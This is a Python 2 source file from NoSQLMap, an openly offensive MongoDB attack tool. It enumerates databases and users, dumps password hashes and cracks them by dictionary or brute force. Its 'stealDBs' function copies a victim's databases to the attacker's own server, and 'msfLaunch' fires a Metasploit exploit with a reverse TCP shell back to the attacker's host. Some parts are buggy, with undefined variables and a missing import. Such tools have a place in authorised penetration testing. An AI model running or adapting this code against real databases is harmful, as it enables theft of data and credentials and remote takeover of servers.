#!/usr/bin/python
#NoSQLMap Copyright 2014 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
import pymongo
import urllib
import json
import gridfs
import itertools
import string
import subprocess
from hashlib import md5
import os

global yes_tag
global no_tag
yes_tag = ['y', 'Y']
no_tag = ['n', 'N']

def netAttacks(target, dbPort, myIP, myPort):
	print "DB Access attacks (MongoDB)"
	print "================="
	mgtOpen = False
	webOpen = False
	mgtSelect = True
	#This is a global for future use with other modules; may change
	global dbList
	dbList = []

	print "Checking to see if credentials are needed..."
	needCreds = mongoScan(target,dbPort,False)

	if needCreds[0] == 0:
		conn = pymongo.MongoClient(target,dbPort)
		print "Successful access with no credentials!"
		mgtOpen = True

	elif needCreds[0] == 1:
		print "Login required!"
		srvUser = raw_input("Enter server username: ")
		srvPass = raw_input("Enter server password: ")
		uri = "mongodb://" + srvUser + ":" + srvPass + "@" + target +"/"

		try:
			conn = pymongo.MongoClient(target)
			print "MongoDB authenticated on " + target + ":27017!"
			mgtOpen = True
		except:
			raw_input("Failed to authenticate.  Press enter to continue...")
			return

	elif needCreds[0] == 2:
		conn = pymongo.MongoClient(target,dbPort)
		print "Access check failure.  Testing will continue but will be unreliable."
		mgtOpen = True

	elif needCreds[0] == 3:
		print "Couldn't connect to Mongo server."
		return


	mgtUrl = "http://" + target + ":28017"
	#Future rev:  Add web management interface parsing

	try:
		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
		if mgtRespCode == 200:
			print "MongoDB web management open at " + mgtUrl + ".  No authentication required!"
			testRest = raw_input("Start tests for REST Interface (y/n)? ")

		if testRest in yes_tag:
			restUrl = mgtUrl + "/listDatabases?text=1"
			restResp = urllib.urlopen(restUrl).read()
			restOn = restResp.find('REST is not enabled.')

			if restOn == -1:
				print "REST interface enabled!"
				dbs = json.loads(restResp)
				menuItem = 1
				print "List of databases from REST API:"

				for x in range(0,len(dbs['databases'])):
					dbTemp= dbs['databases'][x]['name']
					print str(menuItem) + "-" + dbTemp
					menuItem += 1
			else:
				print "REST interface not enabled."
			print "\n"

	except Exception, e:
		print "MongoDB web management closed or requires authentication."

	if mgtOpen == True:

		while mgtSelect:
			print "\n"
			print "1-Get Server Version and Platform"
			print "2-Enumerate Databases/Collections/Users"
			print "3-Check for GridFS"
			print "4-Clone a Database"
			print "5-Launch Metasploit Exploit for Mongo < 2.2.4"
			print "6-Return to Main Menu"
			attack = raw_input("Select an attack: ")

			if attack == "1":
				print "\n"
				getPlatInfo(conn)

			if attack == "2":
				print "\n"
				enumDbs(conn)

			if attack == "3":
				print "\n"
				enumGrid(conn)

			if attack == "4":
				if myIP == "Not Set":
					print "Target database not set!"
				else:
					print "\n"
					stealDBs(myIP,target,conn)

			if attack == "5":
				print "\n"
				msfLaunch()

			if attack == "6":
				return

def stealDBs(myDB,victim,mongoConn):
	dbList = mongoConn.database_names()
	dbLoot = True
	menuItem = 1

	if len(dbList) == 0:
		print "Can't get a list of databases to steal.  The provided credentials may not have rights."
		return

	for dbName in dbList:
		print str(menuItem) + "-" + dbName
		menuItem += 1

	while dbLoot:
		dbLoot = raw_input("Select a database to steal: ")

		if int(dbLoot) > menuItem:
			print "Invalid selection."

		else:
			break

	try:
		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
		dbNeedCreds = raw_input("Does this database require credentials (y/n)? ")

		if dbNeedCreds in no_tag:
			myDBConn = pymongo.MongoClient(myDB,27017)
			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)

		elif dbNeedCreds in yes_tag:
			dbUser = raw_input("Enter database username: ")
			dbPass = raw_input("Enter database password: ")
			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim,dbUser,dbPass)

		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			stealDBs(myDB,victim,mongoConn)

		cloneAnother = raw_input("Database cloned.  Copy another (y/n)? ")

		if cloneAnother in yes_tag:
			stealDBs(myDB,victim,mongoConn)

		else:
			return

	except Exception, e:
		if str(e).find('text search not enabled') != -1:
			raw_input("Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
			return

		else:
			raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
			return

def passCrack (user, encPass):
	select = True
	print "Select password cracking method: "
	print "1-Dictionary Attack"
	print "2-Brute Force"
	print "3-Exit"


	while select:
		select = raw_input("Selection: ")
		if select == "1":
			select = False
			dict_pass(user,encPass)

		elif select == "2":
			select = False
			brute_pass(user,encPass)

		elif select == "3":
			return
	return

def gen_pass(user, passw, hashVal):
	if md5(user + ":mongo:" + str(passw)).hexdigest() == hashVal:
		print "Found - " + user + ":" + passw
		return True
	else:
		return False

def dict_pass(user,key):
	loadCheck = False

	while loadCheck == False:
		dictionary = raw_input("Enter path to password dictionary: ")
		try:
			with open (dictionary) as f:
			       passList = f.readlines()
			loadCheck = True
		except:
			print " Couldn't load file."

	print "Running dictionary attack..."
	for passGuess in passList:
		temp = passGuess.split("\n")[0]
		gotIt = gen_pass (user, temp, key)

		if gotIt == True:
			break
	return

def genBrute(chars, maxLen):
    return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, maxLen + 1)))

def brute_pass(user,key):
	charSel = True
	print "\n"
	maxLen = raw_input("Enter the maximum password length to attempt: ")
	print "1-Lower case letters"
	print "2-Upper case letters"
	print "3-Upper + lower case letters"
	print "4-Numbers only"
	print "5-Alphanumeric (upper and lower case)"
	print "6-Alphanumeric + special characters"
	charSel = raw_input("\nSelect character set to use:")

	if charSel == "1":
		chainSet = string.ascii_lowercase

	elif charSel == "2":
		chainSet= string.ascii_uppercase

	elif charSel == "3":
		chainSet = string.ascii_letters

	elif charSel == "4":
		chainSet = string.digits

	elif charSel == "5":
		chainSet = string.ascii_letters + string.digits

	elif charSel == "6":
		chainSet = string.ascii_letters + string.digits + "!@#$%^&*()-_+={}[]|~`':;<>,.?/"
	count = 0
	print "\n",
	for attempt in genBrute (chainSet,int(maxLen)):
		print "\rCombinations tested: " + str(count) + "\r"
		count += 1
		if md5(user + ":mongo:" + str(attempt)).hexdigest() == key:
			print "\nFound - " + user + ":" + attempt
			break
	return

def getPlatInfo (mongoConn):
	print "Server Info:"
	print "MongoDB Version: " + mongoConn.server_info()['version']
	print "Debugs enabled : " + str(mongoConn.server_info()['debug'])
	print "Platform: " + str(mongoConn.server_info()['bits']) + " bit"
	print "\n"
	return

def enumDbs (mongoConn):
	try:
		print "List of databases:"
		print "\n".join(mongoConn.database_names())
		print "\n"

	except:
		print "Error:  Couldn't list databases.  The provided credentials may not have rights."

	print "List of collections:"

	try:
		for dbItem in mongoConn.database_names():
			db = mongoConn[dbItem]
			print dbItem + ":"
			print "\n".join(db.collection_names())
			print "\n"

			if 'system.users' in db.collection_names():
				users = list(db.system.users.find())
				print "Database Users and Password Hashes:"

				for x in range (0,len(users)):
					print "Username: " + users[x]['user']
					print "Hash: " + users[x]['pwd']
					print "\n"
					crack = raw_input("Crack this hash (y/n)? ")

					if crack in yes_tag:
						passCrack(users[x]['user'],users[x]['pwd'])

	except Exception, e:
		print e
		print "Error:  Couldn't list collections.  The provided credentials may not have rights."

	print "\n"
	return

def msfLaunch():
	try:
		proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)

	except:
		print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
	raw_input("Press enter to continue...")
	return

def enumGrid (mongoConn):
	try:
		for dbItem in mongoConn.database_names():
			try:
				db = mongoConn[dbItem]
				fs = gridfs.GridFS(db)
				files = fs.list()
				print "GridFS enabled on database " + str(dbItem)
				print " list of files:"
				print "\n".join(files)

			except:
				print "GridFS not enabled on " + str(dbItem) + "."

	except:
		print "Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights."

	return

def mongoScan(ip,port,pingIt):

	if pingIt == True:
		test = os.system("ping -c 1 -n -W 1 " + ip + ">/dev/null")

		if test == 0:
			try:
				conn = pymongo.MongoClient(ip,port,connectTimeoutMS=4000,socketTimeoutMS=4000)

				try:
					dbList = conn.database_names()
					dbVer = conn.server_info()['version']
					conn.disconnect()
					return [0,dbVer]

				except:
					if str(sys.exc_info()).find('need to login') != -1:
						conn.disconnect()
						return [1,None]

					else:
						conn.disconnect()
						return [2,None]

			except:
				return [3,None]

		else:
			return [4,None]
	else:
		try:
			conn = pymongo.MongoClient(ip,port,connectTimeoutMS=4000,socketTimeoutMS=4000)

			try:
				dbList = conn.database_names()
				dbVer = conn.server_info()['version']
				conn.disconnect()
				return [0,dbVer]

			except Exception, e:
				if str(e).find('need to login') != -1:
					conn.disconnect()
					return [1,None]

				else:
					conn.disconnect()
					return [2,None]

		except:
			return [3,None]
